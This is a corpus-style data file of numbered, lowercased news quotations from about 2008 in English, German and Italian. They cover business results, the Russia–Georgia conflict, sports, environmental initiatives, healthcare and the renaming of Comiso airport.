8603229 the past is illustrious but writers continue to live and write here
8603230 such a museum would function ideally as both a place to educate people about our writing tradition and a clearinghouse for writers who choose new orleans for their literary habitat

8603232 people are becoming more aware of the negative effects of conventional pesticides at the same time growers are more willing to switch they have more choices and incentive compared to 10 years ago
8603233 i think there has been enough scientific evidence that theres a difference between lets say conventional tomatoes and organic tomatoes in terms of pesticide residues but also improved taste and higher levels of antioxidants
8603234 i think its a combination of the movement of green chemistry trying to protect the environment and peoples thoughts about their own health maybe not even their health but their kids and grandkids health

8603261 this is a momentous decision that offers hope for some of the planets most spectacular wildlife and forests
8603262 there is still much to do however as sumatras forests continue to disappear to feed the growing global demand for pulp paper and palm oil
8603263 this is an important milestone toward securing a future for the sumatran elephant and tiger
8603264 to ensure that the commitment is effectively implemented we must redouble our efforts on the ground to eliminate poaching and illegal settlements within this special forest
8603265 tesso nilo is still under serious threat from illegal activities but if we can protect the forests there it will give some of sumatras most endangered wildlife the breathing room they need to survive
8603266 and while we greatly appreciate this precedent for more protection from the indonesian government there are other areas on sumatra that need safeguarding for the sake of its wildlife its threatened indigenous peoples and to reduce the climate impacts of clearing
8603267 wwf is committed to working at all levels from the field to the boardroom to find solutions for sumatras people and wildlife and the global environment
8603268 here in the us we are calling on companies to ensure that their purchases of pulp paper and palm oil do not contribute to the destruction of sumatras forests
8603269 we have a dedicated and creative team at allegiance who have worked hard to exceed customer expectations and grow the company
8603270 we are honored to be recognized with this award our technology and services are resonating with all types of organizations who realize that engaging customers and employees is the new way to win business
8603271 we are keenly aware of the questions and concerns customers are voicing regarding sap enterprise support
8603272 a key role we play is to ensure our members have access to the facts have the ability to ask questions specific to their own organizational concerns directly of the appropriate people within sap as well as opportunities to offer alternative ideas these panel discussions deliver yet another opportunity for our membership to engage one on one with sap

8603281 with only a week to go before the premiership it is important that we have strength in depth
8603282 this weekend is all about giving game time to as many players as possible and giving them the opportunity to put their hand up for selection for the worcester match
8603283 this is why we have arranged these two tough matches both cardiff and treviso are used to playing at the highest level in the heineken cup which means that our players will have to put in good performances if they want to stand out
8603284 we took some steps forward last weekend our youngsters had a physical outing against nottingham while the game against the force was a real test of our pace and ability to last the full 80 minutes of fast action i am looking for this to happen again on friday and sunday

8603299 as we look forward to the third quarter and balance of the year considering these trends it is extremely difficult to know how the consumer will respond in the back half of the year
8603300 while our history would say that trends would improve what we are seeing today does not support that premise
8603301 we are also looking forward to 2009 with a very cautious outlook
8603302 we began contracting out cardiac surgery cases to other centres two years ago and in the past year we have ensured that we are fully utilising every feasible public and private avenue in new zealand
8603303 that has brought considerable success the number of patients waiting over 6 months peaked at 120 last july and we have now managed that down to just 25 i believe we have turned a corner
8603304 while we are capable of meeting current demand there is a backlog of high priority patients and in that context the decision to outsource to an australian hospital with the capacity to perform that surgery within the next three months makes sense
8603305 as a cardiac surgeon i believe this is an appropriate one off measure which should enable us to get on top of this backlog
8603306 we will be contacting patients who may be suitable to travel to australia and discussing this as an option with them it will be entirely their choice as to whether they wish to pursue this option
8603307 if they are interested in pursuing this option and if we and the australian surgeons agree they are a medically suitable candidate we will make the necessary arrangements for the patient and a support person to travel to australia for their surgery and to return to new zealand after an appropriate recovery time post surgery
8603308 if they decline or for any other reason do not go ahead with the australian option the patient will retain their place on our waiting list and we will book them for surgery here
8603309 its the middle of the cold and flu season so beds are in limited availability nationwide and the reality is we need to proceed with surgery for these high priority patients now not in six months time to ensure any risk is minimised
8603310 we will be using a single provider which will help to streamline the coordination between the dhb the provider and the families and we are also aiming to station a dhb person in australia to help co ordinate things on the ground for those families
8603311 over the past year we have been sending these types of patients to providers around new zealand for surgery including otago auckland waikato and christchurch so in one sense the biggest change in going to australia is its a longer flight
8603312 of course heart surgery is never without risk and we are being upfront about dealing with that including the risk of mortality
8603313 naturally we will only be sending those patients who are declared medically fit for the journey
8603314 can someone point me to research finding around whether users pay attention to a url changes
8603315 we are experiencing some of the toughest industry conditions that we have seen since the late 1970s and early 1980s
8603316 dealers are reducing their inventories significantly and manufacturers orders are considerably below the dealers weak retail sales rates
8603317 this from the man who is supposed to beef up obamas foreign policy and military credentials
8603318 our second quarter results reflect the continued effects of a slowing economy which contributed to the earnings declines we have experienced since the third quarter of 2007

8603325 the problem wasnt his attitude but the tone he set for other parents it became more competitive
8603326 weve made it clear weve posted signs that parents are welcome in our building but not upstairs in the studios or in rehearsals unless specifically invited by a faculty member they want to protect their own children but they also spy on others to compare talents
8603327 its something we have to deal with and hope that students understand that its very difficult to change the parents
8603328 we can only intervene when there is some action taken within the building
8603329 von der psyche her ist es ganz schwierig so etwas wegzustecken
8603330 wir haben nur zwei tage bis zum n chsten heimspiel vielleicht k nnen wir schon gegen bochum etwas tun das uns wieder froh macht
8603331 jetzt sofort danach zu schreien ist schwachsinn wenn unsere verletzten wieder da sind brauchen wir keine weiteren spieler es sei den die sportliche leitung sieht das anders
8603332 ich habe nicht erwartet dass nun alles wie geschnitten brot l uft aber ich glaube nach wie vor dass wir eine mannschaft hier gehts zum kader mit der qualit t haben die wir uns leisten k nnen
8603333 das war einfach zu wenig wir sind in der ersten h lfte gar nicht vors tor gekommen und erst wach geworden als es zu sp t war
8603334 kein sponsor hatte den mut und das vertrauen in diese sache einzusteigen weil sie sich nur oberfl chlich damit besch ftigt haben
8603335 so viel fahrer und personal wie m glich aus dem gerolsteiner team verpflichten
8603336 ich bin keine hy ne es ist kein tag der freude f r uns
8603337 das ist ein sehr schwerer r ckschlag weil es ein team trifft das ebenso durch sportlichen erfolg wie durch einen klaren anti doping kurs gl nzte
8603338 die mannschaft wird wie bei der tour de france einen wahnsinnigen zusammenhalt haben
8603339 als st rmer wird man eben extrem beurteilt ein paar zentimeter entscheiden ob du held oder depp bist
8603340 ich lasse mich nicht verr ckt machen wenn ich eine chance mal vergebe man muss immer weiter machen
8603341 ein wichtiges zeichen f r mich ist dass ich mir die chancen berhaupt erarbeite
8603342 wir sind bei ihm nat rlich auch ein bisschen verw hnt weil er diese absolute qualit t hat problematisch w re es vielleicht wenn er keine chancen h tte
8603343 aber mario bekommt immer seine chancen weil er einfach so gut ist und er wird auch seine treffsicherheit wieder zur ckbekommen
8603344 ist doch klar dass es ein unterschied ist ob man eine lange sommerpause hatte oder ein gro es turnier gespielt hat
8603345 obwohl es noch nicht hundert prozent rund l uft habe ich im pokal und in der liga schon dreimal getroffen das macht mich nat rlich zuversichtlich
8603346 der vfb hat sehr fr h gesagt dass er mich nicht gehen l sst das habe ich akzeptiert damit war die sache f r mich erledigt

8603352 one thing i will say though is that to compare the ordinance with fascism is absurd we are trying to solve issues but are being accused of fascism
8603353 the decision to deliver aid using nato battleships is something that hardly can be explained
8603354 i made clear above all that i would have expected that we would talk about these questions in international organisations before unilateral recognition happened
8603355 there are several un security council resolutions in which the territorial integrity of georgia was stressed which russia also worked on
8603356 we cannot accept these violations of international law of a territory by the army of a neighbouring country
8603357 my country will extend the arm of cooperation and friendship to ease the transition period for south ossetia
8603358 the attitude is i can afford a huge car so i should have one

8603366 this promotion is the culmination of a process which began a year ago when randy keys agreed to step into the cfo role last october prior to his appointment as cfo randy had served on the board of directors since 2004 one of our objectives was to provide a transition period for andrew lai to master both the us and chinese intricacies of our financial operations before assuming the role of cfo with far east andrew has excellent credentials and qualifications including international e amp p experience and a valuable background in chinese culture and business practices but had been with the company for only nine months with an additional year of experience we are confident that andrew has the depth of understanding of the companys history goals and operations necessary for him to excel in this role we appreciate randys contributions both as a board member and in this transition and as he returns to his outside endeavors we wish him the best
8603367 we still provide rights managed footage and unparalleled service to film television and advertising professionals that will never change
8603368 we recognize however there are new rapidly growing market segments using video were offering licensing and pricing to fit how video is being used today from online advertising to unbudgeted projects such as social networks it used to be a small budget meant you were limited to low quality clips usually shot by amateurs now theres no need for emerging media content creators to sacrifice quality just because they have a limited budget
8603369 at thought equity motion weve always looked at things differently we started by offering the worlds largest collection of high production value footage to industry professionals now were empowering the new wave of content producers by providing everyone access to the best quality footage were helping our customers do what they do best create

8603381 if you recognise abkhazia and south ossetia then you cannot blame a republic like chechnya for wanting the same or dagestan or tatarstan they also can be recognized if abkhazia can be
8603382 it would have been better of course if it happened last spring at the nato ministerial summit in romania at the time a number of countries abstained from voting there is no doubt whatsoever now that georgia will become a member of nato too many people have been killed in the conflict to call this an advantage but it has accelerated the process

8603395 but they opened up my budget to about 150 000 81 860 pounds for me to experiment for two weeks in the studio six days later i completed my album i hired all my musicians and we kind of jammed out i gave everyone complete autonomy

8603405 i welcome them to have a dialogue about my work performance and the great qualities i bring to the aedc
8603406 i invite them to sit down and have a real dialogue about my overall qualifications and encourage them to bring their solutions to economic development
8603407 and i thought by getting her out she would cooperate not one word in that direction nothing nothing so now with this immunity deal i think its a situation where she has to face reality if she can she might not have the ability to do that and cooperate with the authorities and if it was an accident once they recovered the body they will know

8603424 as a result of that you caused a fracture to the skull which resulted in death probably instantly then you covered it up there was something almost cynical about the way you tried to cover it up
8603425 you told all sorts of lies some of them absurd lies
8603426 youre both insecure youre both irresponsible youre both the victims of a cycle of depravation but theres nothing in your background which justifies the way you treated this child

8603436 on july 31 one day before the new anti monopoly law went into affect the first of its kind for china came into effect lawyer dong zhengwei formally petitioned the ministry of commerce moc the state administration of industry and commerce saic and the national development and reform commission ndrc to open an antitrust investigation into microsoft dong alleged that microsoft has used its 70 percent market share to manipulate software prices in china he proposed a us 1 billion fine on the company on august 21 dong received a formal notice from the moc stating that antitrust investigations should be conducted by the ndrc and saic in the same day the ndrc formally notified dong that his petition against microsoft had been accepted and would be handled by the ndrcs price monitoring department an official from the drafting committee that wrote the anti monopoly law told caijing that microsoft will face a punishment from ndrc saic and moc if the companys alleged monopolistic activities are verified by the investigation microsoft will have the right to appeal if it is found to be in violation

8603439 the response has been overwhelming we expect it will be standing room only and hope we dont have to turn anyone away
8603440 we really are at an amazing point in our political history
8603441 i think this is just really the time for change
8603442 he obama is being encouraged to be more partisan because many democrats are afraid of him being swift boated
8603443 if he gives a soaring speech he will be hit for not focusing on blue collar democrats who supported clinton hes boxed in
8603444 if you look at his policies they are all extremely specific
8603445 obamas speech will give us the energy and the message we need to leave here primed for the general election
8603446 he said yeah and i want to eat for a living
8603447 i ride most every day and i race every weekend in either one or two races
8603448 it was the first time i ever had a road bike but i really fell in love with it i had a blast it was a release of energy and freedom
8603449 i had never won events before i was a terrible runner and i had done hockey soccer but i was just sort of j v all the way
8603450 i had found something that i had fun with and i was good at
8603451 the start and finish is right in market square so its a long rectangle right through downtown
8603452 each lap takes only two to three minutes to do so its a good race for spectators its not more than every few minutes before you see us go by again
8603453 the whole pretense of the event is promoting a healthy lifestyle and getting families together
8603454 its a sporting event yes but we knew right away we couldnt close off the downtown streets without taking advantage of it and making this into a festival
8603455 if you started riding a road bike it will probably become sort of addictive
8603456 the best way to get into it is to go to a local shop and ask about rides in the area see what it is to go fast before you go to your first race
8603457 it doesnt matter how tired you are you dig as deep as you can when you have a community of 7 000 cheering you on
8603458 and sending it to earthtenders composting facility in farmington new hampshire where it will be made into organic compost
8603459 is that in these difficult times how can we not do whatever we can to conserve resources it used to be considered patriotic to conserve and recycle everything now were told were told were not patriotic if we dont consume
8603460 most customers are surprised we have so much that we can compost
8603461 some local offices are so keen on it they bring back their cups and put them in our compost bins
8603462 im from the seacoast area and when i came back
8603463 it became my passion to do it here in downtown portsmouth permaculture is like a tea bag flowing of every single ingredient together on a daily basis
8603464 when i was being certified we had to keep a daily journal
8603465 i had to write down how i got to work every thing i did in one day
8603466 it worked it made sense i began to see it was important to walk or bike to work to really think about every action i took even the tiniest change can make a difference
8603467 lots of people think they dont have the ability to engineer change
8603468 they can they can become empowered by just using compostable cups and so on all the little things really add up
8603469 for example our customers can bring their own mugs and get coffee for 1 we can do this because they bring their own mugs and no waste products are involved this sounds small but it really isnt small at all
8603470 i really hope to able to get other local business in on this project
8603471 in the long term it can save the city so much money and help the environment by putting waste good waste back into the soil
8603472 unless the country is protected dharma cannot be protected and unless dharma is protected the country cannot be protected
8603473 we know that there are small steps that each of us can take to make our world greener
8603474 we see this effort as an extension of what were attempting to accomplish with our new lifegreen checking and savings account which like yards for trees is a way of saving some green and being a bit greener
8603475 over the course of the season yards for trees will make it possible to plant thousands of new trees in the southeast
8603476 we are delighted to be partnering with regions the sec and raycom to help ensure that the beautiful skies and crisp autumn air that defines college football are something that future generations can also enjoy

8603478 we believe that the dysregulation of developmental pathways such as hedgehog may play a role in the formation or recurrence of cancer therefore we are hopeful that a hedgehog inhibitor such as gdc 0449 may be a useful therapeutic tool in preventing cancer from returning in these ovarian cancer patients and may prove useful as a maintenance therapy
8603479 gdc 0449 is currently in phase ii testing in first line metastatic colorectal cancer and genentech has indicated that it expects to initiate an additional phase ii clinical trial in advanced basal cell carcinoma in the second half of 2008

8603481 metavantes enterprise wide fraud monitoring vision allows us to better prevent fraudulent transactions but equally as important to recognize a pattern of fraud in bill pay for example and use the learning nature of our solution to assist in identifying fraud in other areas such as online banking and other payment channels

8603484 fdk provides high quality on board power solutions with best in class thermal performance at a competitive price
8603485 fdk will continue to expand its line of sensei series converters to meet the demands of a growing global customer base
8603486 frankly i have the feeling the customer will hardly notice the difference
8603487 what they are going to notice though is they theyll eventually have a heck of a lot more seats
8603488 they can get rid of all of them because theyre disgusting
8603489 unless the country is protected dharma cannot be protected and unless dharma is protected the country cannot be protected
8603490 moving from our prior homegrown paper based succession process to successfactors has given us a better method to identify and assess our talent
8603491 using successfactors we are now able to look at talent management through an entirely new lens that gives us the insight to create new ways to retain our top talent and incorporate this into our larger business strategy
8603492 caribou coffee is a great example of a company driving the strategy of its business by aligning employee development with business goals
8603493 successfactors helps to ensure that their population of employees is the best they can be which in turn will help drive more sales better service and more engaged employees
8603494 what i want to know is why didnt the doctors call us when my brother was in his last agony
8603495 we think we notified the family of appropriate changes when they occurred
8603496 we were open with the family the entire time about his prognosis
8603497 im not accusing the hospital of anything until i have a second report
8603498 once ive seen the results of the second autopsy then ill make a decision about what to do
8603499 with its revolutionary formula that features seven of the healthiest fruits on the planet purple has become the superdrink of choice with scores of consumers from florida to new england and new york to hawaii
8603500 we are thrilled to work with well respected distributors like try it to bring purple to the buffalo region now
8603501 we have been hearing about purple since it burst on the scene late last year and are pleased to bring this exciting product to our customers
8603502 after watching the brand achieve great success in other areas of the country it seemed only natural for us to add the product to our inventory of high end beverages
8603503 with digital work accounting for more of our business and with large global clients openly embracing digital solutions wpp has amassed arguably the most robust talent pool resources and technologies in the digital marketing space
8603504 neal is charged with improving our digital services offering and making it more coherent and cost effective across the group by choosing to utilize deliver our agencies will be able to offer clients the best way to do the best work online at the best possible cost
8603505 deliver is a great opportunity because it is not emerging from a standing start
8603506 the agencies that will contribute their expertise are already outsourcing work for their own clients to more economical production facilities in costa rica or eastern europe for example schematic maintains a large staff in costa rica studiocom does the same in colombia via its offshore guys subsidiary blue produces online work for american and european clients in its facilities in singapore aqua has similar capabilities in south africa
8603507 these are just a few examples of the talent pool and resources that wpp has amassed
8603508 my job will be to act as the conduit through which the global demands of wpps agencies are matched with the people who can execute the work in a seamless and economic fashion
8603509 delivers distributed model will enable our agencies to aggregate their scale which will drive the quality of the work as well as the efficiency and economy with which it is delivered its clear that only wpp has the resources to assemble such an offering theres no doubt that clients will benefit
8603510 deliver meets a clear and present client need consistent high quality creative assets produced affordably and in infinite variety to exploit digital communication opportunities around the world we have always had the resources but deliver will aggregate and catalyze our production assets and make them simpler to deploy
8603511 not only do emulexs 8gb s hbas run twice as fast as the previous generation they provide more effective cpu utilization and deliver features that streamline the deployment and simplify the management of fibre channel hbas within the data center
8603512 moreover by working closely with datacore and maintaining backward compatibility with our existing 4gb s and 2gb s hba product lines we ensure that vars system integrators and oems will be able to seamlessly transition to next generation 8gb s fibre channel connectivity solutions
8603513 sure the speed and throughput from these hbas is phenomenal but so is the distinctive emulex hba dual mode driver that lets our partners set the adapters to concurrently operate as both target and initiator this maximizes port utilization cuts down on cabling and gives them much more flexibility to configure their customers environments to accommodate unexpected changes
8603514 das r ttelt an den fundamenten der internationalen ordnung die milit risch vorbereitete anerkennung einer ausl ndischen provinz ist mehr als eine einmischung in die inneren angelegenheiten eines anderen staates damit wird v lkerrecht gebrochen russland verneint und verletzt die territoriale souver nit t und integrit t georgiens alle rechtstreuen staaten m ssen jetzt zusammenstehen sie d rfen die neue lage nicht dulden das mindeste ist kollektiver protest m glich sind auch sanktionen die in verh ltnism igen grenzen als antwort auf die v lkerrechtsverletzung sogar rechtswidrig sein d rfen niemand darf russland auf diesem weg folgen schlie lich steht eine grundlage der internationalen ordnung auf dem spiel
8603515 russland kann zurzeit die muskeln spielen lassen weil nato und eu sich schwertun eine einheitliche linie zu finden zwar k nnen die europ er nicht einfach hinnehmen dass moskau die territoriale integrit t georgiens mir nichts dir nichts ber den haufen wirft aber sie stecken in einem dilemma ber druckmittel um moskau zur raison zu rufen verf gen sie nicht weder der entzug der strategischen partnerschaft noch die verweigerung eines wto beitritts d rften moskau nachhaltig beeindrucken der kreml ist auf krawall gestimmt und h lt konfrontation f r ein zeichen politischer st rke
8603516 falls es irgendeinen zweifel ber die motivation russlands gab den krieg mit georgien zu f hren wurde er gestern ausger umt der russische pr sident dmitri medwedew hat die unabh ngigkeit von s dossetien und abchasien anerkannt es ist allen klar dass diese entscheidung schon beim einrollen der russischen panzer in dieses land feststand europa und seine verb ndeten stehen in der pflicht die territoriale integrit t georgiens zu verteidigen eines demokratischen nachbarns dem man dringend das tor zur nato ffnen muss au erdem m ssen die f hrungskr fte der eu von worten zu taten bergehen und sehr viel h rtere ma nahmen ergreifen solange moskau nicht auf den weg der legalit t zur ckkehrt
8603517 die einen erkl ren es sei kl ger den russischen b r zu beruhigen die anderen behaupten dass er unbedingt in schach gehalten werden muss die stimme der ersten l sst sich vor allem im alten europa h ren die zweiten befinden sich mehrheitlich in gro britannien sowie in polen und anderen l ndern europas die das sowjetische joch erleiden mussten die auseinandersetzung ist noch nicht abgehakt aber ohne zweifel hat europa ein russisches problem der moskauer imperialismus ist sogar eine der wichtigsten herausforderungen der es anfang dieses jahrhunderts begegnen muss
8603518 wer dar ber berrascht ist kann in den vergangenen monaten nicht zugeh rt haben seit kosovo nicht die aufwertung dieser einst serbischen region zum staat hat den herren an der moskwa ein argument geliefert wladimir putin hat seit langem angesagt wie der russische b r l uft auf der f hrte der gro macht dem beispiel der bush regierung folgend es war ein fehler die ank ndigungen und warnungen des damaligen russischen pr sidenten f r blo e rhetorik zu halten
8603519 die anerkennung abchasiens und s dossetiens als selbstst ndige staaten durch russlands pr sidenten macht eine verhandlungsl sung in georgien noch schwieriger stellt sie doch die vermittelnden m chte also die mehrheit der eu staaten vor vollendete tatsachen immerhin hatte der sechs punkte plan der eu gespr che dar ber vorgesehen wie sicherheit und stabilit t in abchasien und s dossetien hergestellt werden k nnten solche verhandlungen k nnen jetzt als einmischung in die inneren angelegenheiten zur ckgewiesen werden auch eine durch den weltsicherheitsrat zu beschlie ende friedensmission der uno liegt jetzt in weiter ferne aber jetzt die verhandlungen ber die georgienkrise einzustellen und auf eine allgemeine konfrontationslinie zu russland einzuschwenken w re ein fataler fehler
8603520 russland spielt europa der nato dem westen deren eigene melodie vor was euch kosovo ist ist uns abchasien und s dossetien das perfide daran dass russland wie der martialische umgang mit tschetschenien bewiesen hat die rechte von minderheiten ziemlich gleichg ltig sind vorrang hat das bem hen wieder ein st ck alter territorialer und imperialer st rke zur ckzugewinnen und was kann es f r russland sch neres geben als sich dabei westlich zivilgesellschaftlicher argumente zu bedienen man wei nun das war vermutlich nur der anfang
8603521 wie russland und der westen aus dieser tiefsten krise seit dem zerfall der sowjetunion wieder herausfinden wollen ist ungewiss dies ist der freie fall und er geschah weil moskau auf eindrucksvolle weise vorf hrt wie man milit risch siegen aber politisch untergehen kann regierung und pr sident brechen lustvoll br cken ab die sie m hsam aufgebaut haben moskau will der weltgemeinschaft seine regeln diktieren aber das wird russland f r alles gas und l der welt kaum gelingen stattdessen hat es sich in eine sackgasse man vriert in der bereits kompromisse wie niederlagen wirken aber den weg hinaus muss moskau alleine finden
8603522 medwedew hat vor allem deutschland und seinen au enminister steinmeier br skiert noch vor wenigen wochen hatte der einen friedensplan f r abchasien vorgelegt mit ausdr cklicher zustimmung moskaus medwedew zog nun den propagandaerfolg vor eigenem publikum der zusammenarbeit mit deutschland vor einem der letzten kooperationswilligen partner in europa
8603523 was aber wollen die europ er der russischen f hrung berhaupt beweisen sanktionen oder eine eiszeit werde es nicht geben haben bernard kouchner und angela merkel der franz sische au enminister und die deutsche kanzlerin schon angek ndigt zu wichtig ist russland als gesch ftspartner die gefahr ist dagegen gro dass die 27 mit gro em pomp der welt ihre uneinigkeit und entschlusslosigkeit zeigen es w re ja nicht das erste mal der eu sondergipfel zur lage in georgien kann zu einem moralischen appell werden einer gemeinsamen besinnung auf den wert der politischen freiheit einer solidarit tsbekundung f r ein land das teil der nachbarschaftspolitik der union ist
8603524 decreasing market demand a change in the types of vehicles being sold and rising raw material prices are making this a tougher market for auto suppliers
8603525 however suppliers with strong technology and solid balance sheets should be able to endure this transitionary period and ultimately benefit from a stronger market environment
8603526 leveraging our auto industry expertise and restructuring specialization helped provide dura with smarter capital
8603527 we continue to work closely with clients through good and challenging times to provide them with the capital they require to meet their business objectives

8603530 overnight home values of 100 000 homeowners along the ej amp e will plummet
8603531 the residents of the region who are positively affected by this transaction have not been given the same convenient opportunity to have their voices heard
8603532 it is a bad situation and every month we delay the taxpayers of illinois are paying money for no reason
8603533 is it because of who the owner is and the owner contributed to certain campaigns is this a pay to play
8603534 getting the data out of the device and into the control system usually uses proprietary software that is not interoperable across platforms
8603535 im not giving a lesson on accountancy but you do write money off over the term of a contract
8603536 what we pay is in an investment during that period you have a player who is doing a job and in this industry you buy and sell players
8603537 you have to look at these things pragmatically sometimes these things dont work as well as you want them to
8603538 remember we got deco for eight million pounds and that looks to be the buy of the season
8603539 the market for the fluid fittings products may be in the 200 million range and the business may have a mid teens market share
8603540 given the companys reach and capabilities it may give the company ample opportunity to grow
8603541 as we look forward to the third quarter and balance of the year considering these trends it is extremely difficult to know how the consumer will respond in the back half of the year
8603542 while our history would say that trends would improve what we are seeing today does not support that premise
8603543 we are also looking forward to 2009 with a very cautious outlook
8603544 we are experiencing some of the toughest industry conditions that we have seen since the late 1970s and early 1980s
8603545 dealers are reducing their inventories significantly and manufacturers orders are considerably below the dealers weak retail sales rates
8603546 in the fourth quarter we exceeded our expectations for sales earnings and inventory reduction
8603547 our retail businesses in both canada and the u s led the way for us again this quarter delivering over 1 billion in combined net income
8603548 we also completed an important capital raise that will allow us to fund our expansion to 1gw of capacity by the end of fiscal 2012
8603549 this strategic acquisition will increase the production reserves and value of our south texas asset base
8603550 come rileva un sondaggio effettuato a suo tempo ha aggiunto lintitolazione a la torre aveva riscontrato scarso gradimento fra i cittadini
8603551 fa parte di unantica consuetudine siciliana uccidere le persone due volte prima fisicamente e poi nella memoria
8603552 vincenzo magliocco ha aggiunto digiacomo il vecchio nome dellaeroporto militare e non centra nulla con la nuova destinazione civile dello scalo inoltre e non una considerazione secondaria anche su comiso oltre che su sigonella la torre fece le sue grandi battaglie pacifiste
8603553 se un sindachetto pu permettersi di cancellare la memoria di un popolo allora rischiamo davvero di non avere futuro
8603554 per pi di una generazione di siciliani e di italiani ha aggiunto comiso un luogo legato a fondamentali battaglie per la pace e la legalit e quelle battaglie hanno avuto come protagonista pio la torre il suo impegno per la pace e contro la mafia ha segnato profondamente una intera classe dirigente della politica siciliana e nazionale volere cancellare tutto questo significa non avere rispetto per la nostra storia
8603555 sottraendo alla propria citt la memoria di pio la torre il sindaco di comiso ragiona come un mafioso
8603556 la torre ha detto fava mor di mafia anche per le sue battaglie in sicilia contro listallazione dei missili cruise intitolargli tardivamente quellaeroporto era stato un modo per rimediare a troppi anni di silenzio la decisione adesso di cancellare il nome di pio la torre ha tutta la forza simbolica duna violenza mafiosa negare i morti negare la memoria parlar daltro
8603557 considero la scelta di cambiare nome allaeroporto di comiso fatta dal sindaco alfano offensiva e inaccettabile
8603558 offensiva ha aggiunto nei confronti della storia siciliana della memoria di pio la torre e di ci che questa figura ha rappresentato inaccettabile perch non comprendiamo le motivazioni che hanno portato a questa decisione ci sembra anzi che lunica motivazione reale sia quella di un vero e proprio atto di arroganza politica cancellare il nome di una figura come pio la torre ucciso dalla mafia che non rappresenta solo una parte politica ma la storia migliore della sicilia una scelta scellerata
8603559 in sicilia ha concluso la finocchiaro tira una brutta aria di revisionismo storico dopo le targhe nelle piazze ora vogliono cambiare i nomi agli aeroporti cancellando la storia siciliana la destra sappia che noi glielo impediremo
8603560 la decisione del sindaco e della giunta di centrodestra di comiso di proporre la cancellazione dellintitolazione dellaeroporto di comiso a pio la torre appare insensata e rozza
8603561 essa offende prima di tutto il popolo di comiso perch ha aggiunto ne disconosce limpegno storico nel movimento per la pace e contro i missili lede la memoria civile dei siciliani e degli italiani i quali unitariamente dai comunisti ai socialisti e ai cattolici dai sindacati al movimento pacifista con la forte presenza dellars e degli enti locali diedero vita negli anni 80 a quel forte movimento per la distensione che fu concausa delluccisione di pio la torre per mano mafiosa
8603562 affinch si mobilitino per impedire un gratuito atto di revisionismmo storico
8603563 per inciso la vecchia intestazione non mai stata messa in discussione n cancellata ha concluso lo monaco cos come il punta raisi stato cointestato a falcone e borsellino laeroporto di comiso si chiama magliocco pio la torre pertanto latto di togliere un martire di mafia appare ancora pi gratuito e pericoloso
8603564 la figura di pio la torre quella di un uomo politico che con enorme coraggio si battuto contro la mafia e per mano della mafia stato ucciso cambiare nome allaeroporto di comiso una scelta che non offende solo la sua memoria ma quella di tutti i siciliani onesti che sperano e credono che sia possibile costruire un futuro diverso e migliore per la propria terra
8603565 voler cancellare ha affermato ancora veltroni la memoria di uomini che per come hanno speso la loro vita rappresentano un patrimonio collettivo e non di parte rappresenta un atto arrogante e davvero incomprensibile non questa la strada per costruire una storia condivisa non questa la strada per restituire alla sicilia e al mezzogiorno orgoglio e memoria di se e del proprio passato migliore
8603566 the challenge is that weve still got disparities so even though weve got better employment rates for maori than we had in the mid 90s theyre still lower than the general population similarly weve got an improvement in life expectancy for maori but theres still a gap between maori and non maori
8603567 i think he has been outstanding i think he has done things that only winston could have done his skills and talents have really moved this countrys partnerships forward hes hard working and his international reputation has built up but hes certainly has to manage this issue at home and over the next couple of days hopefully all be revealed
8603568 they bring out some some of the people that work in the communities that just operate quietly as well as the iconic great leaders within the arts too
8603569 our only other consolation is that the people who purchase those do value them not necessarily with the same value as us but they do have a value for it so its unlikely it is going to be desecrated in any way that would diminish the value that we have for those old paintings and those tipuna
8603570 people like hec busby are rarities hes an icon in his own right he is one of the few recognised international navigators in an elite group of about seven hes quite a simple fellow but the knowledge that he has is enormous
8603571 basically they said the whole book was racist because it said maori were cannibals and they said that was a racist statement so they wanted the book banned and i think common sense prevailed and people realise what cannibalism did take place in this country so they rejected the complaint

8603588 a pharmaceutical product can cost as little as 5 cents in asia so it is hard to envisage a scenario in which an rfid tag costing 20 cents can be added to a product and provide added value to a patient or healthcare system
8603589 its like taking handful of molecules and throwing them at a screen
8603590 the tags are also not activated until they reach the pharmaceutical manufacturers facility and are applied on the production line adding a further safeguard against pilferage of the technology
8603591 for the user its a very simple process but that masks a complex series of processes and systems that is difficult for a counterfeiter to overcome
8603592 counterfeiters across the globe want to produce drugs that are easy to copy and have no loyalty to a brand so they focus on fast moving profitable brands with a low probability of being caught
8603593 our technology has the required complexity to dissuade counterfeiters from working on products that use it
8603594 sophistication is the key there have been some high profile failures in the asian market among companies trying to develop strategies using simple holograms that provide clear support for the need for a high tech sophisticated anti counterfeiting strategy one issue has been that drugmakers have tended to develop a strategy and then put that out to tender to several providers and that has meant that for every secured contract there are a number of disappointed providers with knowledge of the strategy and the capabilities to mimic the anti counterfeiting technology there is not a single hologram that does not have a copy in asia
8603595 in fact this technology has become a menace as it imposes an extra level of responsibility on the manufacture in defending its brand and proving that a product is counterfeit
8603596 most 2d scanners cost thousands of dollars per unit but we have pared the cost down to 100
8603597 today we are talking about a simple barcode which can be combined with the fingerprint scanner to provide a unique authentication system that is secure and commercially viable
8603598 there clearly needs to be convergence of technologies but we have tried to design the scanner with future applications not just counterfeiting in mind
8603599 the underlying base technology can also be used for compliance for example patients could be asked to scan it when they take a drug allowing their use of the medicine to be monitored
8603600 your leg is not broken you have arthritis in it remember a coupla years ago when you were forbidden to run the fence with sam next door and you went and ran the fence with sam anyway and tore your acl at 4 30 in the morning you dont remember that

8603663 barack obama put special effort into the small counties actually establishing campaign offices in elko pahrump and winnemucca and realeased a plan for rural nevada in november and spent face time there
8603664 talks about the need for democrats to campaign in rural america
8603665 but derbys 5 41 percent loss was surprisingly broad based she lost even in clark county
8603666 the democrats including obamas campaign would probably find washoe county a more profitable lode to mine than the small counties
8603667 i think what people in rural america rural nevada are interested in is health care what can be done to make sure that theres a health care delivery system in rural nevada right now its very splintered

8603679 one of them was bleeding from his leg they asked for milk and then huddled us in the kitchen we locked ourselves in as we realised that they were militants but they broke the door and brought us out
8603680 the militants kept threatening us they said they will kill us
8603681 as we tried to convey to the security forces the whereabouts of the militants they tried to break the door but i resisted they then opened fire
8603682 we pleaded with them not to kill us and offered them belongings and cash we asked them to spare as we have small children they locked all of us except my husband who they kept separately in a room

8603690 sanctions are being considered and many other means as well
8603691 we are hoping for a draw that will get us into the group stages we would take on anyone but we will be up against it if we get one of the bigger clubs
8603692 the dream for me would be a draw that gives us a chance and then we get tottenham hamburg and ac milan in the group stages
8603693 akos is back training and thats a massive boost for everyone
8603694 were mindful that hes not had a full pre season and as a result hes doing some extra fitness sessions with john harbin performance manager
8603695 all things being equal though he should be in contention to make the squad for our home fixture against southampton in mid september
